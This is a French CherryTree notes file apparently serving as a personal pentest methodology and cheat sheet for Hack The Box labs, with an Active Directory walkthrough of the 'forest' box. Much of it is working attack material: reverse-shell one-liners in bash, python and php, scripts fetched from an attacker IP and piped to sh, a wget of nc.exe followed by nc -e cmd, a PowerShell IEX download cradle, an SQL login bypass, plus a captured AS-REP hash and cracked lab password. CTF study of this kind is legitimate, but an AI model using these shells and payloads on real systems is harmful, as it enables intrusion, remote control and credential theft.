<?xml version="1.0" ?>
<cherrytree>
	<bookmarks list="6"/>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Guide_Pentest" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587387653.71" ts_lastsave="1588257003.45" unique_id="1">
		<rich_text>To do :
☐ découper élévation de privilège www-data -&gt; user et user -&gt; root 

Faire un guide linux et un windows</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Méthodologie" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587387785.81" ts_lastsave="1587907072.11" unique_id="4">
			<rich_text>---------Préparation-----------                                                                                   
1. Enregistre la target                                                                                           
vi /etc/hosts                                                                                                     
10.10.10.161 $ip_address                                                                                           
                                                                                                                  
2. On scan la machine avec quickscann dans ~/Desktop/tools/masscan/bin/quick_scan.sh                              
Combine masscan pour le scan de tous les ports et nmap pour les noms des services et vulns                        
                                                                                                                  
Autre possibilité utiliser nmap tout seul                                                                         
nmap -sC -sV -Pn- $ip_address                                                                                      
                                                                                                                  
-sC = --script=default.                                                                                           
-sV = Check service version.                                                                                      
-Pn- = skip host discovery and port scan all target hosts.                                                        
                                                                                                                  
puis en udp                                                                                                       
nmap -sU -Pn- $ip_address                                                                                           
                                                                                                                  
3. On peut lancer en complément enum4linux qui va permettre potentiellement de sortir des utilisateurs            
enum4linux $ip_address                                                                                              

4. Tout nom d'utilisateur doit être enregistré dans un fichier / idem pour les mots de passe

5. Si il y a site https, regarder les infos du certificat, nottament la rubrique Issuer qui peut fournir des infos

6. Si site web :
        - Regarder tous les liens du site
        - Noter tous les sous domaines
        - Ajouter les sous domaines dans /etc/hosts

7. On vérifie qu'aucun exploit n'existe :
        a) on relève toutes les versions utilisé
        b) searchsploit nom_service ou exploitdb sur internet
        c) searchsploit nom_service -x nom_exploit
        d) on vérifie que le service est vulnérable à l'exploit ou non

--------Test d'accès--------
On peut vérifier qu'une injection de commande fonctionne grâce à un ping  vers notre machine couplé à :
tcpdump -n -i tun0 icmp

Pour exécuter du code via python
__import__(&quot;os&quot;).system(&quot;ping -c 1 10.10.14.2&quot;)


--------Accès---------------
1. Vérifier qui on est avec : whoami

2. Récupérer le flag user :
linux : cat ~/Desktop/user.txt
windows : type ..\Desktop\user.txt

--------Elevation de privilège----------

Utiliser LinPEAS pour trouver des potentiel exe avec uid bit a 1 
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

#Local network
python -m SimpleHTTPServer 80
curl 10.10.10.10/linpeas.sh | sh

#Without curl
nc -q 5 -lvnp 80 &lt; linpeas.sh
cat &lt; /dev/tcp/10.10.10.10/80 | sh
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Préparation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587388635.05" ts_lastsave="1587907138.77" unique_id="14">
				<rich_text justification="center" scale="h1">Phase de Préparation</rich_text>
				<rich_text>


La phase de préparation décrite ci-dessous a pour principal objectif de mettre en place son environnement de travail pour maximiser les chances de first blood sur une box.

</rich_text>
				<rich_text scale="h2">1.Enregistrer l'adresse ip de la cible

</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text> 

On pourra ajouter les noms des sous-domaines par la suite s'il y en a.

</rich_text>
				<rich_text scale="h2">2. Lancer la BurpSuite</rich_text>
				<rich_text>

Il est fortement probable que nous allons rencontrer des services web. Burp est souvent utile, pour gagner en efficacité, il est intéressant de le lancer avant la phase de pentest.

a) On lance Burp et on crée un nouveau projet
b) On lance notre navigateur
c) On vérifie dans les parmaètres que le proxy vers burp est bien activé
d) On vérifie dans Burp que “intercept is off” dans la rubrique proxy

</rich_text>
				<rich_text scale="h3">3. On ouvre toutes les aides que l'on pourrait avoir besoin</rich_text>
				<rich_text>

Si possible sur un espace de travail dédié

</rich_text>
				<rich_text scale="h2">4. On lance le proxy si nécessaire et on vérifie la connectivité</rich_text>
				<rich_text>

Dans le cas de HTB on peut vérifier le nombre de personnes présentent sur notre serveur vpn

</rich_text>
				<rich_text scale="h2">5. Création d'un répertoire dédié au pentest</rich_text>
				<rich_text>

Celui-ci portera généralement le nom de la box / challenge / entreprise

</rich_text>
				<rich_text scale="h2">6. Création d'un projet CherryTree pour la prise de note</rich_text>
				<rich_text>

Mise en contexte sur la première feuille (date, @ip...)

</rich_text>
				<rich_text scale="h2">7. Passer les Terminals en root</rich_text>
				<rich_text>

</rich_text>
				<codebox char_offset="236" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">vi /etc/hosts
10.10.10.161 forest.htb</codebox>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Reconnaissance" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587387892.57" ts_lastsave="1587390409.5" unique_id="5">
				<rich_text justification="center" scale="h1">Phase de reconnaissance</rich_text>
				<rich_text>

Dans le cadre de HTB la phase de reconnaissance est relativement limité. 

</rich_text>
				<rich_text scale="h2">1. Analyse du nom de la box</rich_text>
				<rich_text>

Le nom de la box peut donner des informations sur la faille à exploiter ou le type de box/challenge.

</rich_text>
				<rich_text scale="h2">2. Analyse du créateur de la box</rich_text>
				<rich_text>

Regarder les anciennes boxs et challenges qu'il a créés.
    a) Le type de machines ou de challenges
    b) Leur difficulté globale
    c) Leur difficulté estimée par les utilisateurs

</rich_text>
				<rich_text scale="h2">4. Relevé de l'OS</rich_text>
				<rich_text>

Préparation des outils utils à l'OS cible, révision des failles les plus couramments vu sur ce type d'OS

</rich_text>
				<rich_text scale="h2">6. Supposition</rich_text>
				<rich_text>
    
Préparer les outils et ressources en lien avec les failles supposer.
Orienter les recherches en priorité vers ces suppositions.

</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Cartographie et énumération" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587387908.76" ts_lastsave="1587907167.76" unique_id="6">
				<rich_text justification="center" scale="h1">Phase de cartographie et d'énumération</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h2">1. Scanner</rich_text>
				<rich_text>

Dans le cadre de rush pour obtenir un first blood il faut organiser la répartition des différents scans entre les membres l'équipe. Les scans de ports et de Vhosts sont réalisés en parallèle.

</rich_text>
				<rich_text scale="h3">   1) Scan de </rich_text>
				<rich_text scale="h3" weight="heavy">ports</rich_text>
				<rich_text>
      1- Méthode 1.a:
 
        Utilisation de quick_scan (script perso combinant masscan pour la découverte de ports et nmap pour les bannières et vulnérabilités)
        
      2- Méthode 1.b:

        Cette méthode revient à une exécution manuelle de quick_scan
        Utilisation de masscan pour la découverte de ports :
        </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
        On extrait les ports dans la variable ports.
        
        Utilisation de nmap pour la découverte de vuln et de bannière sur les ports découvert par masscan
        </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
          
      3- Méthode 2 :

        On utilise uniquement nmap. Cette méthode est moins rapide mais plus simple:
        </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>

        -sC = --script=default.                                                                                           
        -sV = Check service version.                                                                                      
        -Pn- = skip host discovery and port scan all target hosts.
       
      4- Ports inconnus
        
        Si on a des ports que l'on ne connaît pas on peut utiliser la commande netcat
        </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   2) Scan de </rich_text>
				<rich_text scale="h3" weight="heavy">Vhosts</rich_text>
				<rich_text>
        On utilise goburster avec le dictionnaire disponible dans les Seclists pour trouver tous les sous-domaines :
        
</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
</rich_text>
				<rich_text scale="h3">   3) Complément de scan</rich_text>
				<rich_text>
        Certains outils comme enum4linux peuvent apporter des compléments d'informations voir des liste d'utilisateur.
        </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h2">2. Tout </rich_text>
				<rich_text scale="h2" weight="heavy">nom d'utilisateur</rich_text>
				<rich_text scale="h2"> doit être </rich_text>
				<rich_text scale="h2" weight="heavy">enregistré</rich_text>
				<rich_text scale="h2"> dans un fichier </rich_text>
				<rich_text>


</rich_text>
				<rich_text scale="h2">3. Tout </rich_text>
				<rich_text scale="h2" weight="heavy">mot de passe</rich_text>
				<rich_text scale="h2">  doit être </rich_text>
				<rich_text scale="h2" weight="heavy">enregistré</rich_text>
				<rich_text scale="h2"> dans un fichier</rich_text>
				<rich_text>


</rich_text>
				<rich_text scale="h2">4. Tout </rich_text>
				<rich_text scale="h2" weight="heavy">service</rich_text>
				<rich_text scale="h2"> doit être </rich_text>
				<rich_text scale="h2" weight="heavy">enregistré</rich_text>
				<rich_text scale="h2"> dans un fichier</rich_text>
				<rich_text>


</rich_text>
				<rich_text scale="h2">5. Si site web</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   1) Générer une feuille de note web</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   2) Regarder tous les </rich_text>
				<rich_text scale="h3" weight="heavy">liens du sit</rich_text>
				<rich_text scale="h3">e</rich_text>
				<rich_text>
   
</rich_text>
				<rich_text scale="h3">   3) Noter tous les </rich_text>
				<rich_text scale="h3" weight="heavy">sous domaines</rich_text>
				<rich_text>
</rich_text>
				<rich_text scale="h3">  
   4) Ajouter tous les sous domaines à </rich_text>
				<rich_text scale="h3" weight="heavy">/etc/hosts</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   5) Si site https, regarder les </rich_text>
				<rich_text scale="h3" weight="heavy">infos du certificat</rich_text>
				<rich_text scale="h3">, nottament la rubrique Issuer qui peut fournir des infos</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   6) Relever tout potentiel</rich_text>
				<rich_text scale="h3" weight="heavy"> nom d'utilisateur</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   7) Relever le </rich_text>
				<rich_text scale="h3" weight="heavy">CMS</rich_text>
				<rich_text scale="h3"> </rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">   8) Relever le </rich_text>
				<rich_text scale="h3" weight="heavy">langage utilisé</rich_text>
				<rich_text>
</rich_text>
				<rich_text scale="h3"> 
   9) Relever les </rich_text>
				<rich_text scale="h3" weight="heavy">services et versions</rich_text>
				<rich_text scale="h3"> éventuellements</rich_text>
				<rich_text>







</rich_text>
				<codebox char_offset="599" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">masscan -p1-65535,U:1-65535 $ip_address --rate=&quot;1000&quot; -e tun0</codebox>
				<codebox char_offset="777" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">nmap -sV -p $ports --script=&quot;banner,vulners,default&quot; @ip</codebox>
				<codebox char_offset="905" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">nmap -sV -p $ports --script=&quot;banner,vulners,default&quot; @ip</codebox>
				<codebox char_offset="1356" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">netcat $ad_ip $port</codebox>
				<codebox char_offset="1506" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">gobuster dir -u http://@ip_cible -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</codebox>
				<codebox char_offset="1660" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">enum4linux $ip_address </codebox>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Recherche de vulnérabilités" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587387924.17" ts_lastsave="1587485524.47" unique_id="7">
				<rich_text justification="center" scale="h1">Phase de recherche de vulnérabilité</rich_text>
				<rich_text>

1. Vérifier l'existence d'un exploit

   1) Utiliser le fichier de service et leurs versions utilisés sur la cible

   2) Rehercher un exploit 
      1.a- </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
      1.b- ou rechercher sur exploitdb en ligne
      2.a- </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
       
   3) On vérifie que le service est vulnérable ou non
 
2. Si la machine héberge un site web 

   1) Si portail d'authentification
     
      1- Faille SQL
        
         1&gt; Bypass simple 
        </rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
     
      2- Faille XSS
     
      3- à compléter
  
   2) Si formulaire ou input
    
      1- Faille SQL
     
      2- Faille XSS
    
      3- à compléter
  
   3) Si upload
       
        - Utiliser une image magic byte
        - Changer le type mime le cas échéant

   4) Rechercher le code source
  
   5) Analyser le code des pages
 
   6) 

4. Si serveur FTP

   1) Vérifier si l'accès anonyme est autorisé
  </rich_text>
				<codebox char_offset="192" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">searchsploit nom_service</codebox>
				<codebox char_offset="253" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">searchsploit nom_service -x nom_exploit</codebox>
				<codebox char_offset="464" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">'OR 1=1 --</codebox>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Exploitation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587388083.25" ts_lastsave="1588216855.92" unique_id="8">
				<rich_text>La phase d'eploitation va être différenteen fonction des vulnérabilité trouvées

Une fois l'exploitation fonctionnelle, plusieurs possibilités existent :

- On peut éxécuter les commande une à une sans shell :
Il faut alors mettre en place un reverse shell ou un accès ssh fonctionnel

</rich_text>
				<rich_text scale="h2">Côté client :</rich_text>
				<rich_text>
Ouvrir un listener 
rlwrap nc -lvnp &lt;PORT&gt;

</rich_text>
				<rich_text scale="h2">Côté cible :</rich_text>
				<rich_text>
utiliser un reverse shell proposé aux adresse proposé dans </rich_text>
				<rich_text link="node 175">Resources</rich_text>
				<rich_text>

</rich_text>
				<rich_text scale="h3">bash</rich_text>
				<rich_text>
bash -i &gt;&amp; /dev/tcp/$ip_address /$port 0&gt;&amp;1

</rich_text>
				<rich_text scale="h3">python</rich_text>
				<rich_text>
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;$ip_address&quot;,$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'

avec les &quot; échappés :

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;$ip_address \&quot;,$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'


</rich_text>
				<rich_text scale="h3">php</rich_text>
				<rich_text>
php -r '$sock=fsockopen(&quot;$ip_address &quot;,$port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'

bash -i &gt;&amp; /dev/tcp/$ip_address /$port 0&gt;&amp;1

</rich_text>
				<rich_text scale="h2">Pour windows :</rich_text>
				<rich_text>
                                    Reverse shell
</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>




- On a un accès shell dégradé :
On cherche à avoir un accès ssh : voir </rich_text>
				<rich_text link="node 173">ssh</rich_text>
				<rich_text>

- On a un accès ssh fonctionnel</rich_text>
				<codebox char_offset="1172" frame_height="120" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">@Attacker Terminal1
rlwrap nc -l -vv -p 6666
@Attacker Terminal2
cd /usr/share/windows-resources/binaries ;  python -m SimpleHTTPServer 80
@Target
wget http://10.10.14.11/nc.exe -O nc.exe
.\nc.exe 10.10.14.11 6666 -e cmd</codebox>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Élévation de privilèges " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587388417.18" ts_lastsave="1588203188.93" unique_id="9">
				<rich_text>
Connaitre sur quel fichier on a les droits
find / -type f -user www-data

liste port ouverts
netstat -tnulp

Regarder l'hhistorique des commandes
regarder dans ~/.bash_history


pour les appels cron et commande des autres joueurs
</rich_text>
				<rich_text link="webs https://github.com/DominicBreuker/pspy" scale="h1">pspy</rich_text>
				<rich_text>



Sur linux premier réflexe :
sudo -l

syntax de réponse :

(utilisateur dont on prends les droit) NOPASSWD : commande entière

si le nom d'utilisateur on peut faire sudo commande entière avec les droit root
sinon il faut ajouter -u nom_utilisateur

Référence toutes les méthodes pour les app connues
</rich_text>
				<rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
				<rich_text>


privilege-escalation-awesome-scripts-suite/linpeas

#Local network
python -m SimpleHTTPServer 80
curl $ip_address/linpeas.sh | sh
wget $ip_address/linpeas.sh | sh


#Without curl
nc -q 5 -lvnp 80 &lt; linpeas.sh
cat &lt; /dev/tcp/$ip_address /$port | sh

regarder dans /opt




Elevation de privilège windows
</rich_text>
				<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Maintien d’accès" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587486197.13" ts_lastsave="1587486197.13" unique_id="177">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Propagation/déplacements latéraux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587388463.48" ts_lastsave="1587388463.48" unique_id="11">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="CleanUp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587388586.18" ts_lastsave="1587388586.18" unique_id="12">
				<rich_text></rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="La présentation du rapport" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587388597.51" ts_lastsave="1587388597.51" unique_id="13">
				<rich_text></rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Cheat-sheet" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587387774.71" ts_lastsave="1587513081.76" unique_id="3">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Services" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587512526.95" ts_lastsave="1588201079.77" unique_id="20">
				<rich_text>
To Do List :

</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="active_directory" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1588202085.87" unique_id="15">
					<rich_text scale="h2">1. Énumérer les users soit en utilisant rpc soit enum4linux</rich_text>
					<rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


</rich_text>
					<rich_text scale="h2">2. Se synchroniser avec le DC kerberos</rich_text>
					<rich_text>

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h2">3. Exploitation par ASREPRoast</rich_text>
					<rich_text>
&quot;&quot;&quot;
En résumé, l’attaque consiste à vérifier si un utilisateur du domaine ne requiert pas de pré-authentification Kerberos, et si c’est le cas, on peut récupérer des informations chiffrées concernant le compte de l’utilisateur, qu’on peut ensuite craquer hors-ligne pour y trouver son mot de passe.
&quot;&quot;&quot;
l'outil de impacket permet de tester la vulnérabilité

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

Résultat :
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>


On voit que svc_alfresco a UF_DONT_REQUIRE_PREAUTH parametré

</rich_text>
					<rich_text scale="h3">    b/ Enregistrer le hash</rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">    c/ Chercher à cracker le hash</rich_text>
					<rich_text>

    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

    Le mot de passe est s3rvice

    </rich_text>
					<rich_text scale="h3">d/ Connexion via WinRm au port 5985 en utilisant evil-winrm</rich_text>
					<rich_text>
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
					<rich_text scale="h2">4. Récupération de données Active Directory</rich_text>
					<rich_text>

Utiliser Bloodhood

    </rich_text>
					<rich_text scale="h3">a) Installation de Bloodhound</rich_text>
					<rich_text>
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

    </rich_text>
					<rich_text scale="h3">b) Mise en place de bloodhound</rich_text>
					<rich_text>

    Sur notre machine on lance un serveur web
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

    On télécharge Sharphound
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

    côté victime on télecharge le script avec powershell
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
</rich_text>
					<codebox char_offset="137" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">ntpdate $ip_address</codebox>
					<codebox char_offset="529" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">GetNPUsers.py htb.local/ -dc-ip  -usersfile users.txt</codebox>
					<codebox char_offset="543" frame_height="500" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">root@kali:~/Desktop/HTB/forest# GetNPUsers.py htb.local/ -dc-ip forest.htb -usersfile users.txt
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f26e2d83a61e519f5b4b34c08bc39daf$8e855ad842448aca2f030281624db45d217a8b5ab72d0c10eede9defe517a3a64c0675f55291427326e9c30c8d287dabc9946ca767981ce569b49a8a6bb9893182461643ef99392ebd2c171fdceccfb0bb9f1eee0c49db16bb3cf7384f4d3ccf99d70a331db94121403933b9c1821cd1000d3112d375565facb7ef9ca953cf1d2201a307d3f4c1f9331e9589a516bbe13858a73a00b501d532eff8fd5c7a9a70b66d35464952032980809bf7cd59aadcf91bd368f6467a3512dc0df95347890d2bbc6b212c1b9215c7e211c64809c3fc99f129347701ecad6b633f77c1dd39639658da09e323
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set</codebox>
					<codebox char_offset="676" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">john --wordlist=~/Desktop/tools/wordlist/rockyou.txt krb5.hash</codebox>
					<codebox char_offset="780" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</codebox>
					<codebox char_offset="922" frame_height="260" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">apt install bloodhound
LimitNOFILE=60000
mkdir /usr/share/neo4j/logs
mkdir /usr/share/neo4j/run
neo4j start

systemctl daemon-reload
systemctl stop neo4j
systemctl disable neo4j
systemctl enable neo4j
systemctl start neo4j

bloodhound
</codebox>
					<codebox char_offset="1011" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">python -m SimpleHTTPServer 80</codebox>
					<codebox char_offset="1047" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">wget https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1</codebox>
					<codebox char_offset="1111" frame_height="40" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">powershell -command &quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -LDAPUser svc-alfresco -LDAPPass s3rvice&quot;</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="github" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587515924.94" unique_id="125">
					<rich_text>
</rich_text>
					<rich_text scale="h2">Cloner des commit avec problème de certificat SSL :</rich_text>
					<rich_text>
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>


</rich_text>
					<rich_text scale="h2">Rechercher des leaks d'info dans des commit :</rich_text>
					<rich_text>

1. Utiliser gitleaks 
   1) Installer go
   2) Installer gitleaks 
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

   3) Utiliser gitleaks
  </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
2. Utiliser trufflehog


B) Utiliser trufflehog
   1) Installer trufflehog
   2) Utiliser des trufflehog
    </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text style="italic">note : nécessite le chemin absolu après file:// d'où $(pwd) pour le chemin relatif</rich_text>
					<rich_text>, </rich_text>
					<rich_text style="italic">pour gagner du temps on peu directement ce mettre dans le répertoire cible</rich_text>
					<rich_text>



</rich_text>
					<rich_text scale="h2">Recherche manuel de leaks :</rich_text>
					<rich_text>

• Voir tous les commit
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

• Voir les modifications effectuées
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>


</rich_text>
					<rich_text scale="h2">SSH abusing via git</rich_text>
					<rich_text>
Si :
      ▪ On obtient un compte github
      ▪ La machine possède un port ssh (autre que le 22 généralement)

</rich_text>
					<rich_text scale="h3">1. On génère partage la clef : </rich_text>
					<rich_text>

ssh-keygen nom_clef

On sur le compte github -&gt; </rich_text>
					<rich_text style="italic">Paramètre</rich_text>
					<rich_text> -&gt; </rich_text>
					<rich_text style="italic">SSH Keys</rich_text>
					<rich_text> -&gt;</rich_text>
					<rich_text style="italic"> Add Keys</rich_text>
					<rich_text> 
Dans</rich_text>
					<rich_text style="italic"> content </rich_text>
					<rich_text>on ajoute le contenu de la clef publique généré

</rich_text>
					<rich_text scale="h3">2. On ajoute la cible sur notre machine</rich_text>
					<rich_text>

Exemple avec la clef dinesh
Sur notre machine ajouter dans ~/.ssh/config

</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
</rich_text>
					<codebox char_offset="53" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">git -c http.sslVerify=false clone https://example.com/path/to/git</codebox>
					<codebox char_offset="175" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">go get github.com/zricethezav/gitleaks</codebox>
					<codebox char_offset="204" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">gitleaks -v --repo-path=./repo_path</codebox>
					<codebox char_offset="315" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">trufflehog file://$(pwd)/repo_path</codebox>
